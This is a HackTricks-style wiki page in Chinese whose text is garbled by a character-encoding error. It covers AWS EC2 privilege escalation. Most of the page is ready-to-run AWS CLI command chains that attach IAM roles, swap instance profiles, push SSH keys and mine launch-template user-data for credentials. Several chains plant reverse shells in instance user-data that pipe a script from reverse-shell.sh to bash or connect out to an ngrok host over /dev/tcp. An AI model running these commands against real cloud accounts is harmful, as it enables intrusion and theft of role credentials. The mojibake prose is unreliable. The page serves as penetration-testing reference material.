# AWS - EC2 Privesc

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## EC2

æœ‰å…³ **EC2 çš„æ›´å¤šä¿¡æ¯**ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

æ”»å‡»è€…å¯ä»¥ **åˆ›å»ºä¸€ä¸ªé™„åŠ  IAM è§’è‰²çš„å®ä¾‹ï¼Œç„¶åè®¿é—®è¯¥å®ä¾‹** ä»¥ä»å…ƒæ•°æ®ç«¯ç‚¹çªƒå– IAM è§’è‰²å‡­è¯ã€‚

* **é€šè¿‡ SSH è®¿é—®**

ä½¿ç”¨ **åˆ›å»ºçš„** **ssh å¯†é’¥** (`--key-name`) è¿è¡Œä¸€ä¸ªæ–°å®ä¾‹ï¼Œç„¶å ssh è¿›å…¥å®ƒï¼ˆå¦‚æœæ‚¨æƒ³åˆ›å»ºä¸€ä¸ªæ–°çš„ï¼Œæ‚¨å¯èƒ½éœ€è¦æ‹¥æœ‰ `ec2:CreateKeyPair` æƒé™ï¼‰ã€‚
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
* **é€šè¿‡ç”¨æˆ·æ•°æ®è®¿é—® rev shell**

æ‚¨å¯ä»¥ä½¿ç”¨ **ç”¨æˆ·æ•°æ®** (`--user-data`) å¯åŠ¨ä¸€ä¸ªæ–°å®ä¾‹ï¼Œè¯¥å®ä¾‹å°†å‘æ‚¨å‘é€ä¸€ä¸ª **rev shell**ã€‚æ‚¨ä¸éœ€è¦ä»¥è¿™ç§æ–¹å¼æŒ‡å®šå®‰å…¨ç»„ã€‚
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=E<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
å°å¿ƒä½¿ç”¨å®ä¾‹å¤–çš„ IAM è§’è‰²å‡­è¯æ—¶çš„ GuradDutyï¼š

{% content-ref url="../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md" %}
[aws-guardduty-enum.md](../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md)
{% endcontent-ref %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°ä»»ä½•é™„åŠ åˆ°ç°æœ‰å®ä¾‹é…ç½®æ–‡ä»¶çš„ EC2 è§’è‰²ã€‚

#### æå‡æƒé™åˆ° ECS

é€šè¿‡è¿™ç»„æƒé™ï¼Œæ‚¨è¿˜å¯ä»¥ **åˆ›å»ºä¸€ä¸ª EC2 å®ä¾‹å¹¶å°†å…¶æ³¨å†Œåˆ° ECS é›†ç¾¤ä¸­**ã€‚è¿™æ ·ï¼ŒECS **æœåŠ¡** å°†åœ¨æ‚¨æœ‰è®¿é—®æƒé™çš„ **EC2 å®ä¾‹** ä¸­ **è¿è¡Œ**ï¼Œç„¶åæ‚¨å¯ä»¥æ¸—é€è¿™äº›æœåŠ¡ï¼ˆdocker å®¹å™¨ï¼‰å¹¶ **çªƒå–å…¶é™„åŠ çš„ ECS è§’è‰²**ã€‚

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
{% endcode %}

è¦äº†è§£å¦‚ä½•**å¼ºåˆ¶åœ¨è¿™ä¸ªæ–°çš„ EC2 å®ä¾‹ä¸­è¿è¡Œ ECS æœåŠ¡**ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

å¦‚æœæ‚¨**æ— æ³•åˆ›å»ºæ–°å®ä¾‹**ä½†æ‹¥æœ‰æƒé™`ecs:RegisterContainerInstance`ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿåœ¨é›†ç¾¤ä¸­æ³¨å†Œè¯¥å®ä¾‹å¹¶æ‰§è¡Œè¯„è®ºæ”»å‡»ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°é™„åŠ åˆ°ä»»åŠ¡çš„ ECS è§’è‰²ã€‚

### **`iam:PassRole`ï¼Œ** **`iam:AddRoleToInstanceProfile`**

ä¸ä¹‹å‰çš„åœºæ™¯ç±»ä¼¼ï¼Œæ‹¥æœ‰è¿™äº›æƒé™çš„æ”»å‡»è€…å¯ä»¥**æ›´æ”¹è¢«æ”»é™·å®ä¾‹çš„ IAM è§’è‰²**ï¼Œä»¥ä¾¿çªƒå–æ–°çš„å‡­è¯ã€‚\
ç”±äºå®ä¾‹é…ç½®æ–‡ä»¶åªèƒ½æœ‰ 1 ä¸ªè§’è‰²ï¼Œå¦‚æœå®ä¾‹é…ç½®æ–‡ä»¶**å·²ç»æœ‰ä¸€ä¸ªè§’è‰²**ï¼ˆå¸¸è§æƒ…å†µï¼‰ï¼Œæ‚¨è¿˜éœ€è¦**`iam:RemoveRoleFromInstanceProfile`**ã€‚

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
{% endcode %}

å¦‚æœ **å®ä¾‹é…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªè§’è‰²** å¹¶ä¸”æ”»å‡»è€… **æ— æ³•åˆ é™¤å®ƒ**ï¼Œè¿˜æœ‰å¦ä¸€ç§å˜é€šæ–¹æ³•ã€‚ä»–å¯ä»¥ **æ‰¾åˆ°** ä¸€ä¸ª **æ²¡æœ‰è§’è‰²çš„å®ä¾‹é…ç½®æ–‡ä»¶** æˆ– **åˆ›å»ºä¸€ä¸ªæ–°çš„** (`iam:CreateInstanceProfile`)ï¼Œ**å°†** **è§’è‰²** æ·»åŠ åˆ°è¯¥ **å®ä¾‹é…ç½®æ–‡ä»¶**ï¼ˆå¦‚å‰æ‰€è¿°ï¼‰ï¼Œå¹¶ **å°†å®ä¾‹é…ç½®æ–‡ä»¶** å…³è”åˆ°ä¸€ä¸ªè¢«æ”»é™·çš„ **å®ä¾‹ï¼š**

* å¦‚æœå®ä¾‹ **æ²¡æœ‰ä»»ä½•å®ä¾‹** é…ç½®æ–‡ä»¶ (`ec2:AssociateIamInstanceProfile`) \*

{% code overflow="wrap" %}
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°ä¸åŒçš„ EC2 è§’è‰²ï¼ˆä½ éœ€è¦å·²ç»æ”»é™·ä¸€ä¸ª AWS EC2 å®ä¾‹å¹¶ä¸”æ‹¥æœ‰ä¸€äº›é¢å¤–çš„æƒé™æˆ–ç‰¹å®šçš„å®ä¾‹é…ç½®æ–‡ä»¶çŠ¶æ€ï¼‰ã€‚

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

æ‹¥æœ‰è¿™äº›æƒé™åï¼Œå¯ä»¥æ›´æ”¹ä¸å®ä¾‹å…³è”çš„å®ä¾‹é…ç½®æ–‡ä»¶ï¼Œå› æ­¤å¦‚æœæ”»å‡»è€…å·²ç»è®¿é—®äº†ä¸€ä¸ªå®ä¾‹ï¼Œä»–å°†èƒ½å¤Ÿé€šè¿‡æ›´æ”¹ä¸ä¹‹å…³è”çš„é…ç½®æ–‡ä»¶æ¥çªƒå–æ›´å¤šå®ä¾‹é…ç½®æ–‡ä»¶è§’è‰²çš„å‡­è¯ã€‚

* å¦‚æœå®ƒ **æœ‰ä¸€ä¸ªå®ä¾‹é…ç½®æ–‡ä»¶**ï¼Œä½ å¯ä»¥ **ç§»é™¤** å®ä¾‹é…ç½®æ–‡ä»¶ (`ec2:DisassociateIamInstanceProfile`) å¹¶ **å…³è”** å®ƒ \*

{% code overflow="wrap" %}
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* æˆ–è€… **æ›¿æ¢** è¢«æ”»é™·å®ä¾‹çš„ **å®ä¾‹é…ç½®æ–‡ä»¶** (`ec2:ReplaceIamInstanceProfileAssociation`). *

{% code overflow="wrap" %}
````
```bash
aws ec2 replace-iam-instance-profile-association --iam-instance-profile Name=<value> --association-id <value>
```
````
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°ä¸åŒçš„ EC2 è§’è‰²ï¼ˆæ‚¨éœ€è¦å·²ç»æ”»é™·ä¸€ä¸ª AWS EC2 å®ä¾‹ï¼Œå¹¶ä¸”æ‹¥æœ‰ä¸€äº›é¢å¤–çš„æƒé™æˆ–ç‰¹å®šçš„å®ä¾‹é…ç½®æ–‡ä»¶çŠ¶æ€ï¼‰ã€‚

### `ec2:RequestSpotInstances`,`iam:PassRole`

æ‹¥æœ‰æƒé™ **`ec2:RequestSpotInstances` å’Œ `iam:PassRole`** çš„æ”»å‡»è€…å¯ä»¥ **è¯·æ±‚** ä¸€ä¸ªå¸¦æœ‰ **EC2 è§’è‰²** çš„ **Spot å®ä¾‹**ï¼Œå¹¶åœ¨ **ç”¨æˆ·æ•°æ®** ä¸­æ”¾ç½®ä¸€ä¸ª **åå‘ shell**ã€‚\
ä¸€æ—¦å®ä¾‹è¿è¡Œï¼Œä»–å¯ä»¥ **çªƒå– IAM è§’è‰²**ã€‚

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
{% endcode %}

### `ec2:ModifyInstanceAttribute`

æ‹¥æœ‰ **`ec2:ModifyInstanceAttribute`** çš„æ”»å‡»è€…å¯ä»¥ä¿®æ”¹å®ä¾‹å±æ€§ã€‚å…¶ä¸­ï¼Œä»–å¯ä»¥ **æ›´æ”¹ç”¨æˆ·æ•°æ®**ï¼Œè¿™æ„å‘³ç€ä»–å¯ä»¥ä½¿å®ä¾‹ **è¿è¡Œä»»æ„æ•°æ®**ã€‚è¿™å¯ä»¥ç”¨æ¥è·å– **å¯¹ EC2 å®ä¾‹çš„åå‘ shell**ã€‚

è¯·æ³¨æ„ï¼Œå±æ€§åªèƒ½åœ¨ **å®ä¾‹åœæ­¢æ—¶** è¿›è¡Œ **ä¿®æ”¹**ï¼Œå› æ­¤éœ€è¦ **æƒé™** **`ec2:StopInstances`** å’Œ **`ec2:StartInstances`**ã€‚
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°ä»»ä½•é™„åŠ åˆ°åˆ›å»ºå®ä¾‹çš„ EC2 IAM è§’è‰²ã€‚

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

å…·æœ‰æƒé™ **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate` å’Œ `ec2:ModifyLaunchTemplate`** çš„æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ª **æ–°çš„å¯åŠ¨æ¨¡æ¿ç‰ˆæœ¬**ï¼Œåœ¨ **ç”¨æˆ·æ•°æ®** ä¸­åŒ…å« **åå‘ shell** å’Œ **ä»»ä½• EC2 IAM è§’è‰²**ï¼Œæ›´æ”¹é»˜è®¤ç‰ˆæœ¬ï¼Œä»»ä½• **ä½¿ç”¨** è¯¥ **å¯åŠ¨æ¨¡æ¿** çš„ **è‡ªåŠ¨æ‰©å±•ç»„** å¦‚æœé…ç½®ä¸ºä½¿ç”¨ **æœ€æ–°** æˆ– **é»˜è®¤ç‰ˆæœ¬**ï¼Œå°†ä¼š **é‡æ–°è¿è¡Œå®ä¾‹**ï¼Œå¹¶æ‰§è¡Œåå‘ shellã€‚

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°ä¸åŒçš„ EC2 è§’è‰²ã€‚

### `autoscaling:CreateLaunchConfiguration`, `autoscaling:CreateAutoScalingGroup`, `iam:PassRole`

æ‹¥æœ‰æƒé™ **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** çš„æ”»å‡»è€…å¯ä»¥ **åˆ›å»ºä¸€ä¸ªå¯åŠ¨é…ç½®**ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ª **IAM è§’è‰²** å’Œä¸€ä¸ª **åå‘ shell** åœ¨ **ç”¨æˆ·æ•°æ®** ä¸­ï¼Œç„¶å **ä»è¯¥é…ç½®åˆ›å»ºä¸€ä¸ªè‡ªåŠ¨æ‰©å±•ç»„**ï¼Œå¹¶ç­‰å¾…åå‘ shell **çªƒå– IAM è§’è‰²**ã€‚
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°ä¸åŒçš„ EC2 è§’è‰²ã€‚

### `!autoscaling`

æƒé™é›† **`ec2:CreateLaunchTemplate`** å’Œ **`autoscaling:CreateAutoScalingGroup`** **ä¸è¶³ä»¥æå‡** æƒé™åˆ° IAM è§’è‰²ï¼Œå› ä¸ºè¦é™„åŠ åœ¨å¯åŠ¨é…ç½®æˆ–å¯åŠ¨æ¨¡æ¿ä¸­æŒ‡å®šçš„è§’è‰² **ä½ éœ€è¦æƒé™ `iam:PassRole` å’Œ `ec2:RunInstances`** ï¼ˆè¿™æ˜¯ä¸€ç§å·²çŸ¥çš„æƒé™æå‡ï¼‰ã€‚

### `ec2-instance-connect:SendSSHPublicKey`

æ‹¥æœ‰æƒé™ **`ec2-instance-connect:SendSSHPublicKey`** çš„æ”»å‡»è€…å¯ä»¥å°† ssh å¯†é’¥æ·»åŠ åˆ°ç”¨æˆ·å¹¶ä½¿ç”¨å®ƒè®¿é—®ï¼ˆå¦‚æœä»–æœ‰å¯¹å®ä¾‹çš„ ssh è®¿é—®æƒé™ï¼‰æˆ–æå‡æƒé™ã€‚
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°é™„åŠ åˆ°è¿è¡Œå®ä¾‹çš„ EC2 IAM è§’è‰²ã€‚

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

æ‹¥æœ‰æƒé™ **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** çš„æ”»å‡»è€…å¯ä»¥ **å‘ä¸²è¡Œè¿æ¥æ·»åŠ  ssh å¯†é’¥**ã€‚å¦‚æœä¸²è¡Œæœªå¯ç”¨ï¼Œæ”»å‡»è€…éœ€è¦æƒé™ **`ec2:EnableSerialConsoleAccess` æ¥å¯ç”¨å®ƒ**ã€‚

ä¸ºäº†è¿æ¥åˆ°ä¸²è¡Œç«¯å£ï¼Œæ‚¨è¿˜ **éœ€è¦çŸ¥é“æœºå™¨å†…éƒ¨ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç **ã€‚

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
{% endcode %}

è¿™ç§æ–¹å¼å¯¹æƒé™æå‡å¹¶ä¸æ˜¯å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºä½ éœ€è¦çŸ¥é“ç”¨æˆ·åå’Œå¯†ç æ‰èƒ½åˆ©ç”¨å®ƒã€‚

**æ½œåœ¨å½±å“ï¼š**ï¼ˆé«˜åº¦ä¸å¯è¯æ˜ï¼‰ç›´æ¥æå‡åˆ°é™„åŠ åˆ°è¿è¡Œå®ä¾‹çš„ EC2 IAM è§’è‰²ã€‚

### `describe-launch-templates`,`describe-launch-template-versions`

ç”±äºå¯åŠ¨æ¨¡æ¿å…·æœ‰ç‰ˆæœ¬æ§åˆ¶ï¼Œæ‹¥æœ‰ **`ec2:describe-launch-templates`** å’Œ **`ec2:describe-launch-template-versions`** æƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æƒé™å‘ç°æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·æ•°æ®ä¸­å­˜åœ¨çš„å‡­æ®ã€‚ä¸ºæ­¤ï¼Œä»¥ä¸‹è„šæœ¬å¾ªç¯éå†æ‰€æœ‰å¯ç”¨å¯åŠ¨æ¨¡æ¿çš„ç‰ˆæœ¬ï¼š

{% code overflow="wrap" %}
```bash
for i in $(aws ec2 describe-launch-templates --region us-east-1 | jq -r '.LaunchTemplates[].LaunchTemplateId')
do
echo "[*] Analyzing $i"
aws ec2 describe-launch-template-versions --launch-template-id $i --region us-east-1 | jq -r '.LaunchTemplateVersions[] | "\(.VersionNumber) \(.LaunchTemplateData.UserData)"' | while read version userdata
do
echo "VersionNumber: $version"
echo "$userdata" | base64 -d
echo
done | grep -iE "aws_|password|token|api"
done
```
{% endcode %}

åœ¨ä¸Šè¿°å‘½ä»¤ä¸­ï¼Œå°½ç®¡æˆ‘ä»¬æŒ‡å®šäº†æŸäº›æ¨¡å¼ï¼ˆ`aws_|password|token|api`ï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸åŒçš„æ­£åˆ™è¡¨è¾¾å¼æ¥æœç´¢å…¶ä»–ç±»å‹çš„æ•æ„Ÿä¿¡æ¯ã€‚

å‡è®¾æˆ‘ä»¬æ‰¾åˆ°äº† `aws_access_key_id` å’Œ `aws_secret_access_key`ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™äº›å‡­æ®æ¥è®¤è¯åˆ° AWSã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ° IAM ç”¨æˆ·çš„æƒé™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
